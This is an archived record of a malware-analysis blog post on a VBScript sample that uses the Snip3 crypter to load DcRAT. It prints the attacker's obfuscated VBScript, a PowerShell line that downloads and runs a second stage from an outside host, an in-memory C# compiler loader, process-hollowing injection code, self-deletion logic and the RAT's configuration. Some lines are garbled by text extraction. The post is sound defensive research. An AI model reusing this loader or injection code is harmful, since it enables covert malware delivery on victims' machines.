{
    "id": "6e6029e5-7183-4244-bea5-010d38c26858",
    "created_at": "2023-01-12T15:01:06.70978Z",
    "updated_at": "2025-03-27T02:08:40.909604Z",
    "deleted_at": null,
    "sha1_hash": "133cc271e589d87e6550b0d80c902ba34db45a84",
    "title": "2022-04-16 - Snip3 Crypter used with DCRat via VBScript",
    "authors": "",
    "file_creation_date": "2022-05-28T05:07:18Z",
    "file_modification_date": "2022-05-28T05:07:18Z",
    "file_size": 164839,
    "plain_text": "# Snip3 Crypter used with DCRat via VBScript\n\n**forensicitguy.github.io/snip3-crypter-dcrat-vbs/**\n\n### By Tony Lambert Posted 2022-04-16 16 min read\n\n\nApril 16, 2022\n\n\n### Adversaries love using free or cheap RATs or stealers, and I see a lot of RATs such as AsyncRAT during my daily malware analysis tasks. In this detection I want to examine a fairly recent sample from in MalwareBazaar that involves Snip3 crypter and DcRAT, an AsyncRAT clone. If you want to follow along at home, the sample is available here in MalwareBazaar: https://bazaar.abuse.ch/sample/78a742710aa79e0574a6faefecfaf851b64043889e75768f5de091cfc5a21dc0/.\n\n## Analyzing the first stage\n\n### Jumping into the analysis of the first stage, we can see the code is VBScript. Some of the code includes Dim keywords, and that’s usually an easy way to tell. The grand majority of the code in the script is responsible for some form of obfuscation and the only real important parts are the obj.Add, which eventually translates into a WScript.shell call, and the Camtasia variable, which reduces down to PowerShell code after some text replacement.\n\n\n-----\n\n```\n  Set obj = CreateObject(\"Scripting.Dictionary\")\n  obj.Add \"W\", \"Apple\"\n  obj.Add \"S\", \"Bluetooth\"\n  obj.Add \"c\", \"Clear\"\n  obj.Add \"r\", \"Orange\"\n  obj.Add \"i\", \"Application\"\n  obj.Add \"p\", \"Windows\"\n  obj.Add \"t\", \"Linux\"\n  obj.Add \".\", \"Ubuntu\"\n  obj.Add \"s\", \"Building\"\n  obj.Add \"h\", \"Car\"\n  obj.Add \"e\", \"Book\"\n  obj.Add \"l\", \"SmartPhone\"\n  obj.Add \"L\", \"Computer\"\n  Dim Keys, WS\n  Keys = obj.Keys\n  For Each K In Keys\n       WS = WS & K\n  Next\n  Dim Camtasia\n  Camtasia = \"金Ｚ難月竹大中心口田手尸［；、/一山女弓人竹廿弓[金Ｚ難月竹大中心口田手尸［；、/一山女弓人竹廿弓\n  S...\"\n  Camtasia = Replace(Camtasia, \"金Ｚ難月竹大中心口田手尸［；、/一山女弓人竹廿弓\", \"\")\n  Set Lenovo = GetObject(\"\", WS)\n  obj.RemoveAll()\n  Dim Nvidia\n  Nvidia = \"PowerShell -ExecutionPolicy RemoteSigned -Command \"\n  Lenovo.Run Nvidia & Camtasia, 0\n\n### I’ve reduced the amount of code for brevity but in the full sample there is a large chunk of non-English Unicode characters that eventually get removed to produce this PowerShell code:\n\n```\n\n-----\n\n```\n  [System.Net.WebClient] $Client = New-Object System.Net.WebClient; [Byte[]] $DownloadedData =\n  $Client.DownloadData('hxxps://textbin[.]net/raw/mevlbkxshp'); [String] $ByteToString =\n  [System.Text.UTF8Encoding]::UTF8.GetString($DownloadedData); [System.IO.File]::WriteAllText('C:\\Users\\Public\\mevlbkxshp.PS1',\n  $ByteToString, [System.Text.Encoding]::UTF8); Invoke-Expression 'PowerShell -ExecutionPolicy RemoteSigned -File\n  C:\\Users\\Public\\mevlbkxshp.PS1'\n\n### The PowerShell code is designed to download the next stage from hxxps://textbin[.]net/raw/mevlbkxshp, write the contents to disk as mevlbkxshp.PS1 and then executing the script. It’s simple and straightforward with just the single purpose. The fun comes in the next stage!\n\n## Analyzing the second stage\n\n### The second stage downloaded from textbin[.]net contains a lot of code that is encoded in decimal or URL encoding. The first part of the script contains\n\n```\n\n-----\n\n```\n  Add-Type -AssemblyName System.Windows.Forms\n  Add-Type -AssemblyName Microsoft.VisualBasic\n  Add-Type -AssemblyName Microsoft.CSharp\n  Add-Type -AssemblyName System.Management\n  Add-Type -AssemblyName System.Web\n  [Byte[]] $RUNPE = @(31,139,8,0,0,0,0,0,4,0,...)\n  Function INSTALL() {\n    [String] $VBSRun =\n  [System.Text.Encoding]::Default.GetString(@(83,101,116,32,79,98,106,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83\n ,48))\n    [System.IO.File]::WriteAllText(([System.Environment]::GetFolderPath(7) + \"\\\" + \"MicroSoftOutlookLauncher.vbs\"), $VBSRun.Replace\n  }\n  Function Decompress {\n       [CmdletBinding()]\n    Param (\n           [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]\n      [byte[]] $byteArray = $(Throw(\"-byteArray is required\"))\n    )\n       Process {\n      $input = New-Object System.IO.MemoryStream(, $byteArray )\n         $output = New-Object System.IO.MemoryStream\n      $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)\n         $gzipStream.CopyTo( $output )\n      $gzipStream.Close()\n           $input.Close()\n           [byte[]] $byteOutArray = $output.ToArray()\n      return $byteOutArray\n    }\n  }\n\n### This chunk of code defines some of the overhead boilerplate code involved with the Snip3 crypter. The $RUNPE variable contains decimal- encoded, gzip-compressed chunk of C# code. The INSTALL() function writes a bare minimum bit of code to disk to execute this downloaded code in the future. The Decompress() function inflates the compression on $RUNPE later down the line to make it usable. The second chunk of the script contains loads of additional boilerplate code from Snip3 designed to compile the RunPE code in memory, make the bare minimum of evidence on disk, and then load the generated RunPE assembly into memory.\n\n```\n\n-----\n\n```\n  function CodeDom([Byte[]] $BB, [String] $TP, [String] $MT) {\n  $dictionary = new-object 'System.Collections.Generic.Dictionary[[string],[string]]'\n  $dictionary.Add(\"CompilerVersion\", \"v4.0\")\n  $CsharpCompiler = New-Object Microsoft.CSharp.CSharpCodeProvider($dictionary)\n  $CompilerParametres = New-Object System.CodeDom.Compiler.CompilerParameters\n  $CompilerParametres.ReferencedAssemblies.Add(\"System.dll\")\n  $CompilerParametres.ReferencedAssemblies.Add(\"System.Management.dll\")\n  $CompilerParametres.ReferencedAssemblies.Add(\"System.Windows.Forms.dll\")\n  $CompilerParametres.ReferencedAssemblies.Add(\"mscorlib.dll\")\n  $CompilerParametres.ReferencedAssemblies.Add(\"Microsoft.VisualBasic.dll\")\n  $CompilerParametres.IncludeDebugInformation = $false\n  $CompilerParametres.GenerateExecutable = $false\n  $CompilerParametres.GenerateInMemory = $true\n  $CompilerParametres.CompilerOptions += \"/platform:X86 /unsafe /target:library\"\n  $BB = Decompress($BB)\n  [System.CodeDom.Compiler.CompilerResults] $CompilerResults = $CsharpCompiler.CompileAssemblyFromSource($CompilerParametres,\n  [System.Text.Encoding]::Default.GetString($BB))\n  [Type] $T = $CompilerResults.CompiledAssembly.GetType($TP)\n  [Byte[]] $Bytes = [System.Web.HttpUtility]::UrlDecodeToBytes([Microsoft.VisualBasic.Strings]::StrReverse('00%00%00...'))\n\n### The $CSharpCompiler and $CompilerParametres variables hold objects and parameters around C# code compilation. When this code executes, you’ll see PowerShell spawning one or more csc.exe processes to convert the code into an executable assembly. The last variable $Bytes holds the adversary’s payload that Snip3 crypter protects during deployment. The payload is embedded within the script as bytes that are URL encoded and reversed afterward. We can easily obtain the original payload by executing the line of PowerShell storing the payload into $Bytes and then using Set-Content to write the content to disk. We can also obtain the RunPE code by doing the same with passing $RUNPE through Decompress() before writing the contents to disk using Set-Content . The final chunk of code is responsible for calling the RunPE injection code, telling it to spawn regsvcs.exe, and inject the final payload $Bytes into the memory space of\nregsvcs.exe .\n  try\n  {\n  [String] $MyPt =\n  [System.IO.Path]::Combine([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory(),\"RegSvcs.exe\")\n  [Object[]] $Params=@($MyPt.Replace(\"Framework64\",\"Framework\"),$Bytes)\n  return $T.GetMethod($MT).Invoke($null, $Params)\n  } catch { }\n  }\n  INSTALL\n  [System.Threading.Thread]::Sleep(1000)\n  CodeDom $RUNPE \"GIT.Repository\" \"Execute\"\n\n```\n\n-----\n\n### o e e t e e a e t o pat s e ca b a c to o ou est gat o e p o g S p3 a d e p o g t e a pay oad e st pat e e going to take is exploring Snip3.\n\n## Examining Snip3’s code\n\n### The entry point invoked in the Snip3 code is [GIT.Repository]::Execute . The code is slightly obfuscated in some places but the variable names are extremely self-explanatory.\n```\n  namespace GIT\n  {\n    public sealed class Repository\n    {\n      public static void Execute(string path, byte[] payload)\n      {\n        for (int i = 0; i < 5; i++)\n        {\n          int readWrite = 0x0;\n          NativeMethods.StartupInformation si = new NativeMethods.StartupInformation();\n          NativeMethods.ProcessInformation pi = new NativeMethods.ProcessInformation();\n          si.Size = (UInt32)(Marshal.SizeOf(typeof(NativeMethods.StartupInformation))); //Attention !\n          try\n          {\n            bool createProc = NativeMethods.CreateProcessA(path, \"\", IntPtr.Zero, IntPtr.Zero, false, 0x00000004 |\n  0x08000000, IntPtr.Zero, null, ref si, ref pi);\n            if (!createProc)\n            {\n              throw new Exception();\n            }\n            ...\n            if (imageBase == baseAddress)\n            {\n              if (NativeMethods.ZwUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0)\n              {\n                throw new Exception();\n              }\n            }\n            ...\n            bool writeProcessMemory = NativeMethods.WriteProcessMemory(pi.ProcessHandle, newImageBase, payload,\n  sizeOfHeaders, ref readWrite);\n            if (!writeProcessMemory)\n            {\n              throw new Exception();\n            }\n\n```\n\n-----\n\n### Some of the structure and variable names reference Windows API methods used during process hollowing injection. These include\n```\nWriteProcessMemory, ZwUnmapViewOfSection, and CreateProcessA . While the structure and variable names are self-explanatory, the\n\n process of those names getting attached to the actual API calls is slightly more obfuscated. This can be seen in Helper struct. Each of the API calls and DLL names required are stored as an integer array that must be decoded in a later function.\n    public struct Helper\n    {\n      public static int[] Kernel32 = new int[] { 3105607, 3104713, 3106650, 3106054, 3104713, 3105756, 3097263, 3097114 };\n      public static int[] NtDLL = new int[] { 3106054, 3106948, 3104564, 3105756, 3105756 };\n      public static int[] ResumeThread = new int[] { 3101882, 3104713, 3106799, 3107097, 3105905, 3104713, 3102180, 3105160,\n  3106650, 3104713, 3104117, 3104564 };\n      public static int[] Wow64SetThreadContext = new int[] { 3102627, 3106203, 3107395, 3097710, 3097412, 3102031, 3104713,\n  3106948, 3102180, 3105160, 3106650, 3104713, 3104117, 3104564, 3099647, 3106203, 3106054, 3106948, 3104713, 3107544, 3106948\n  };\n      public static int[] SetThreadContext = new int[] { 3102031, 3104713, 3106948, 3102180, 3105160, 3106650, 3104713,\n  3104117, 3104564, 3099647, 3106203, 3106054, 3106948, 3104713, 3107544, 3106948 };\n      public static int[] Wow64GetThreadContext = new int[] { 3102627, 3106203, 3107395, 3097710, 3097412, 3100243, 3104713,\n  3106948, 3102180, 3105160, 3106650, 3104713, 3104117, 3104564, 3099647, 3106203, 3106054, 3106948, 3104713, 3107544, 3106948\n  };\n      public static int[] GetThreadContext = new int[] { 3100243, 3104713, 3106948, 3102180, 3105160, 3106650, 3104713,\n  3104117, 3104564, 3099647, 3106203, 3106054, 3106948, 3104713, 3107544, 3106948 };\n      public static int[] VirtualAllocEx = new int[] { 3102478, 3105309, 3106650, 3106948, 3107097, 3104117, 3105756,\n  3099349, 3105756, 3105756, 3106203, 3104415, 3099945, 3107544 };\n      public static int[] WriteProcessMemory = new int[] { 3102627, 3106650, 3105309, 3106948, 3104713, 3101584, 3106650,\n  3106203, 3104415, 3104713, 3106799, 3106799, 3101137, 3104713, 3105905, 3106203, 3106650, 3107693 };\n      public static int[] ReadProcessMemory = new int[] { 3101882, 3104713, 3104117, 3104564, 3101584, 3106650, 3106203,\n  3104415, 3104713, 3106799, 3106799, 3101137, 3104713, 3105905, 3106203, 3106650, 3107693 };\n      public static int[] ZwUnmapViewOfSection = new int[] { 3103074, 3107395, 3102329, 3106054, 3105905, 3104117, 3106352,\n  3102478, 3105309, 3104713, 3107395, 3101435, 3104862, 3102031, 3104713, 3104415, 3106948, 3105309, 3106203, 3106054 };\n      public static int[] CreateProcessA = new int[] { 3099647, 3106650, 3104713, 3104117, 3106948, 3104713, 3101584,\n  3106650, 3106203, 3104415, 3104713, 3106799, 3106799, 3099349 };\n    }\n\n The API mapping to structure name process is handled by code from this NativeMethods class in the crypter. During the mapping process the class calls Decode.BytesToString() in another class to finish translating each integer array to a string needed for the API.\n\n```\n\n-----\n\n```\n    public abstract class NativeMethods\n    {\n      private const string Key = \"QoMn4OhGfV+oHNb8AzV==\";\n      public delegate int DelegateResumeThread(IntPtr handle);\n      public delegate bool DelegateWow64SetThreadContext(IntPtr thread, int[] context);\n      public delegate bool DelegateSetThreadContext(IntPtr thread, int[] context);\n      public delegate bool DelegateWow64GetThreadContext(IntPtr thread, int[] context);\n      public delegate bool DelegateGetThreadContext(IntPtr thread, int[] context);\n      public delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);\n      public delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref\n  int bytesWritten);\n      public delegate bool DelegateReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref\n  int bytesRead);\n      public delegate int DelegateZwUnmapViewOfSection(IntPtr process, int baseAddress);\n      public delegate bool DelegateCreateProcessA(string applicationName, string commandLine, IntPtr processAttributes,\n  IntPtr threadAttributes,\n        bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation\n  startupInfo, ref ProcessInformation processInformation);\n      public static readonly DelegateResumeThread ResumeThread = LoadApi<DelegateResumeThread>\n  (Decode.BytesToString(Decode.IntegerToBytes(Helper.Kernel32, Key)),\n  Decode.BytesToString(Decode.IntegerToBytes(Helper.ResumeThread, Key)));\n      public static readonly DelegateWow64SetThreadContext Wow64SetThreadContext = LoadApi<DelegateWow64SetThreadContext>\n  (Decode.BytesToString(Decode.IntegerToBytes(Helper.Kernel32, Key)),\n  Decode.BytesToString(Decode.IntegerToBytes(Helper.Wow64SetThreadContext, Key)));\n  ...\n\n## How do we know it’s Snip3?\n\n### There are multiple different crypter products that adversaries might choose. Other crypters tend to include a DLL injection component embedded in a PowerShell script, but Snip3 is the only one I’ve run across that distributes its injection component as raw C# source and compiled it on the victim host. There are also code overlaps with this blog post from Morphisec. Pretty much the majority of the CodeDom() and INSTALL() functions overlapped with the code seen by Morphisec.\n\n## Identifying the final payload (DcRAT)\n\n### Threats mixed with a crypter in this manner are often difficult to identify. This is largely because the final payload never gets written to disk in plaintext during execution. Most of the time the final payloads I see are RATs and stealers. Now that we’ve extracted the payload from the crypter component, we can explore what the payload is.\n\n A good first step is to triage the binary with diec .\n  remnux@remnux:~/cases/dcrat-snip3$ diec\n  payload.exe \n  PE32\n    Library: .NET(v4.0.30319)[-]\n    Compiler: VB.NET(-)[-]\n    Linker: Microsoft Linker(8.0)[GUI32]\n\n```\n\n-----\n\n### etect t asy t s e e oo g at a e ecutab e co p ed us g at sa d, e ca t y to deco p e t e e ecutab e us g\n```\nilspycmd .\n  remnux@remnux:~/cases/dcrat-snip3$ ilspycmd payload.exe >\n  payload.decompiled.cs\n  remnux@remnux:~/cases/dcrat-snip3$ head payload.decompiled.cs \n  using System;\n  using System.Collections;\n  using System.Collections.Generic;\n  using System.Diagnostics;\n  using System.Drawing.Imaging;\n  using System.IO;\n  using System.IO.Compression;\n  using System.Linq;\n  using System.Management;\n  using System.Net;\n\n Awesome, it looks like we have some valid source code! Inside the source I tend to look for a few things. First, I look for obfuscation. In this sample, it doesn’t look like we have any at all. We can tell this by looking for strings, function names, and variable names.\n\n```\n\n-----\n\n```\n  FileStream fileStream = new FileStream(((FileSystemInfo)val).get_FullName(),\n  FileMode.CreateNew);\n  byte[] array = File.ReadAllBytes(fileName);\n  fileStream.Write(array, 0, array.Length);\n  Methods.ClientOnExit();\n  string text = Path.GetTempFileName() + \".bat\";\n  using (StreamWriter streamWriter = new StreamWriter(text))\n  {\n    streamWriter.WriteLine(\"@echo off\");\n    streamWriter.WriteLine(\"timeout 3 > NUL\");\n    streamWriter.WriteLine(\"START \\\"\\\" \\\"\" + ((FileSystemInfo)val).get_FullName() + \"\\\"\");\n    streamWriter.WriteLine(\"CD \" + Path.GetTempPath());\n    streamWriter.WriteLine(\"DEL \\\"\" + Path.GetFileName(text) + \"\\\" /f /q\");\n  }\n  ProcessStartInfo val5 = new ProcessStartInfo();\n  val5.set_FileName(text);\n  val5.set_CreateNoWindow(true);\n  val5.set_ErrorDialog(false);\n  val5.set_UseShellExecute(false);\n  val5.set_WindowStyle((ProcessWindowStyle)1);\n  Process.Start(val5);\n  Environment.Exit(0);\n\n### The chunk of code above writes a timeout and deletion command to a Batch script file and then executes it. This is usually a self-deletion measure for RATs and stealers. If obfuscation was involved in this sample, very little of the code above would be readable. The strings would likely be scrambled as would the variable names. In some cases of obfuscation, adversaries may even try to use non-English Unicode characters to make the code unreadable.\n\n The next thing I tend to look for is some form of a settings/configuration block. We can find this relatively early in the decompiled code:\n  public static class Settings\n  {\n    public static string Por_ts = \"usFKhAwZB0s5E032xkSVfg7l+Ch91dfu+A08UlFLF49Q30Ft0dZAYmucm8sTGi/dwaJ+M3FgfdYZ8cPP8D1V+w==\";\n    public static string Hos_ts = \"F09WwBBWBuVtFrk9Sq585p4pSPXpOKP4VsaBWaqfQ9X6FBhLlsklmDXupr4ISZVUh6yZXGtWnOMqJJK+ObQwpRK6tzgcdVgA\n    public static string Ver_sion = \"yt5wqjF7PeriwF2ATQgo1qaGu8ohghvvWFdY7y7X0C5deqcnj9VHSiD4wq7X5aEN+1P6NP9WYGQQIAbd9kf3lA==\";\n    public static string In_stall = \"2t2u9kfC5A1rQP6SZhw4iizbdOd43zK972n9x0JBS1pGDDenkZU0OJAiJeJkrkStNij5dIdB9czAC+W70P4YFg==\";\n    public static string Install_Folder = \"%AppData%\";\n    public static string Install_File = \"\";\n    public static string Key = \"MnB2MzZTUFI4bTFFZXNVUW1tdlI0bFJ1blNMUUZIbk4=\";\n    public static string MTX = \"jswrBrmmYlOHF153N6vUcJ18KLbBZCuS9UMeDq2PFEF4OMujEGd96QJnoQXKp+uYbf/MH9tlXkezr+SQPtOInOpodPFxZKzrM4H\n    public static string Certifi_cate =\n  \"FRt1VyhVG2vgyDBi5pdeM5A14MRbYXnBrM5qQ1T21evDrOwE8p5VDe0OmshQuNw9cMHBouTEK3wDr4FDYT0RrxdzN60qxRZw+gwkmF+opxLh4N15jgtAB/XtKl1qRsQEJd\n  K4F\"\n\n```\n\n-----\n\n```\n  public static string Server_signa_ture = \"SINLJan/0TFj5M2ElE91NPC7mWSMGkC99zKmLdlQkd/I8LyHWPnj5hDLz90v8qYZRV1d9X3mLu4fDn/EYWiG/\n  public static X509Certificate2 Server_Certificate;\n  public static Aes256 aes256;\n  public static string Paste_bin = \"bJMeCQ+O0TOP7Mimb+LvM7YW+MG+LMhrig9F98i7Nq0Cf6vDG5QD0dDmvlpP2i6osVFcGu8J6upk/n9X7YOx1g==\";\n  public static string BS_OD = \"5e5wxuNXiS4QhUtSFmcXlMN/zwGpAgWFR7TAEtRIDeyN7OWkaRRNeC9nJ6ntc9Hvc8wF3OAqcV8YGGhscsQSSg==\";\n  public static string Hw_id = null;\n  public static string De_lay = \"1\";\n  public static string Group = \"wZWrR/yvCwjmNMoS1xk3yYz/TleFz0+gmpNA4gJZ2vgSeyfX/K73NfIcVfuLUGPasaVgSUO6pLJoNVcB/FqlSw==\";\n  public static string Anti_Process = \"aZ12B0T+g0y0kb+3txbww4Hoe7T+8yiR2wblpQCzwI+pB0INXDGOhXaWNkf8CLZDqhgO/CPYoMwlZJ0FMl0Fhg==\";\n  public static string An_ti = \"yFsA3ZmKBpFvdy3/VrPEwMuoG+BVaWzfBohXvIqmZ2LoaiIqz+StD0aFxFuZIufPAvKtRXVJZ2NUVhR7YAGyRA==\";\n  public static bool InitializeSettings()\n  {\n    ...\n\n```\n\n-----\n\n### The Settings class for this payload contains a block of settings that appear consistent with AsyncRAT settings. Since it looks like we’re working with AsyncRAT or a clone of it, we can use the AsyncRAT Config Parser from @jeFF0Falltrades to obtain the plaintext configuration.\n```\n  remnux@remnux:~/cases/dcrat-snip3$ ./async_rat_config_parser.py payload.exe | jq\n  [\n   {\n    \"file_path\": \"payload.exe\",\n    \"aes_key\": \"846ca7dddc5312f58468a967e5e7a4ec9e6de4120b03a1806dbfd976785a95d8\",\n    \"aes_salt\": \"4463526174427971777164616e6368756e\",\n    \"config\": {\n     \"Por_ts\": \"5900\",\n     \"Hos_ts\": \"rick63.publicvm[.]com\",\n     \"Ver_sion\": \" 1.0.7\",\n     \"In_stall\": \"false\",\n     \"Install_Folder\": \"%AppData%\",\n     \"Install_File\": \"\",\n     \"Key\": \"MnB2MzZTUFI4bTFFZXNVUW1tdlI0bFJ1blNMUUZIbk4=\",\n     \"MTX\": \"DcRatMutex_qwqdanchun\",\n     \"Certifi_cate\":\n  \"MIICMDCCAZmgAwIBAgIVANDdhyIzFkRkVUdU1pUsWShwjeXTMA0GCSqGSIb3DQEBDQUAMGQxFTATBgNVBAMMDERjUmF0IFNlcnZlcjETMBEGA1UECwwKcXdxZGFuY2h1bj\n  Q5f\",\n     \"Server_signa_ture\": \"UWZseCaaZjexEDVQ2lOsjGF3/bzIWM+AtaMG8YJOKeCH6T82VGt+odwaoTThFyioEEzEKgOuucbs5V3F2LoXzpK1RtKu8B4z62M6aSv\n     \"Paste_bin\": \"null\",\n     \"BS_OD\": \"false\",\n     \"De_lay\": \"1\",\n     \"Group\": \"Default\",\n     \"Anti_Process\": \"false\",\n     \"An_ti\": \"false\"\n    }\n   }\n  ]\n\n Now that we’ve parsed the configuration, a couple things look slightly odd. In authentic AsyncRAT payloads the mutex (MTX) value appears similar to AsyncMutex_6SI8OkPnk . In this case, the MTX value is DcRatMutex_qwqdanchun . This leads me to hypothesize that this\n l d i ll D RAT i t d f A RAT S h di it? DCR t i ti ll l f A RAT ith\n\n```\n\n-----\n\n### e t a t gs added, so t e co gu at o po t o s de te y c ose e oug to be pa sed by a yt g t at ca a d e sy c e e t piece of evidence would be the Certificate field in the configuration. Once parsed using CyberChef’s “Parse X.509 Certificate (base64)” recipe, we can see the details of the self-signed certificate included with the payload:\n```\n  Version:     3 (0x02)\n  Serial number:  1192410316816341397168958607972492981491697837523\n  (0x00d0dd872233164464554754d6952c5928708de5d3)\n  Algorithm ID:   SHA512withRSA\n  Validity\n   Not Before:   27/11/2020 21:25:45 (dd-mm-yyyy hh:mm:ss) (201127212545Z)\n   Not After:   06/09/2031 21:25:45 (dd-mm-yyyy hh:mm:ss) (310906212545Z)\n  Issuer\n   CN = DcRat Server\n   OU = qwqdanchun\n   O = DcRat By qwqdanchun\n   L = SH\n   C = CN\n  Subject\n   CN = DcRat\n  Public Key\n   Algorithm:   RSA\n   Length:     1024 bits\n   Modulus:    90:0f:37:a8:40:01:8b:65:16:9a:6b:b2:0f:9a:c0:d6:\n           06:5d:ef:a0:be:b2:15:a1:54:33:da:e6:cd:8e:09:50:\n           29:c7:81:31:b8:6b:07:d7:c9:65:f5:c9:90:32:e8:97:\n           af:da:dc:97:78:27:27:12:e7:55:be:cd:98:0b:6d:c8:\n           ca:f2:bc:11:c8:9f:80:50:8f:53:24:de:20:84:23:ef:\n           4a:0a:97:8a:a4:f3:c2:bb:8f:a3:ec:fc:07:8d:71:71:\n           d7:52:27:c2:2f:e3:d4:5e:16:96:46:35:f6:f3:0b:80:\n           0b:e5:4d:e0:5a:3f:86:ab:ea:38:12:1d:53:8a:0a:eb\n   Exponent:    65537 (0x10001)\n  Certificate Signature\n   Algorithm:   SHA512withRSA\n   Signature:   7f:b0:6c:4c:18:81:34:85:dc:d4:6e:49:a2:db:8c:02:\n           d3:f0:4e:65:9a:1a:e4:91:ce:e5:f1:1e:dd:a2:39:ea:\n           66:a1:80:e8:6a:88:47:70:75:68:44:43:29:e5:fa:61:\n           8d:e6:b1:d9:b0:e2:e2:b8:2b:ba:96:5e:e5:91:86:39:\n           f5:65:bc:1e:79:ae:18:ad:4c:93:2e:d4:ee:d4:e6:09:\n           a4:4f:73:ee:f5:53:7d:78:bb:3e:49:7e:8f:dd:7c:ee:\n           46:7c:7f:e4:be:12:f1:68:f5:ac:36:60:ee:63:2b:d5:\n           13:c9:9f:1d:86:d4:2e:86:90:bd:b1:14:82:c1:0e:5f\n  Extensions\n   subjectKeyIdentifier :\n    a2789004e1977ae704604cec0cf720f6c630ca66\n   basicConstraints CRITICAL:\n    cA=true\n\n```\n\n-----\n\n### In the case of AsyncRAT, the CN field would be “AsyncRAT Server” or something similar. In this case, it’s “DCRat Server”, more evidence of DCRat. The final piece of evidence comes from an interesting place in the payload’s decompiled source. When AsyncRAT and its clones generate a RAT client, the settings of that client are encrypted with AES and salted. In the case of AsyncRAT, the salt is a byte array:\n```\n  private static readonly byte[] Salt =\n        {\n        0xBF, 0xEB, 0x1E, 0x56, 0xFB, 0xCD, 0x97, 0x3B, 0xB2, 0x19, 0x2, 0x24, 0x30, 0xA5, 0x78, 0x43, 0x0, 0x3D,\n  0x56,\n        0x44, 0xD2, 0x1E, 0x62, 0xB9, 0xD4, 0xF1, 0x80, 0xE7, 0xE6, 0xC3, 0x39, 0x41\n      };\n\n In the sample, the salt value is different:\n  private static readonly byte[] Salt =\n  Encoding.ASCII.GetBytes(\"DcRatByqwqdanchun\");\n\n This finding in the payload source is consistent with the source code of DcRAT in Github. Thus, we can definitively say this threat is DcRAT! Remember, when analyzing payloads protected with crypters you can’t always assume they lead to one particular threat, you have to positively identify the final threat using evidence instead of assumptions.\n\n Thank you for reading!\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-04-16 - Snip3 Crypter used with DCRat via VBScript.pdf"
    ],
    "report_names": [
        "2022-04-16 - Snip3 Crypter used with DCRat via VBScript.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535666,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1653714438,
    "ts_modification_date": 1653714438,
    "files": {
        "pdf": "https://archive.orkl.eu/133cc271e589d87e6550b0d80c902ba34db45a84.pdf",
        "text": "https://archive.orkl.eu/133cc271e589d87e6550b0d80c902ba34db45a84.txt",
        "img": "https://archive.orkl.eu/133cc271e589d87e6550b0d80c902ba34db45a84.jpg"
    }
}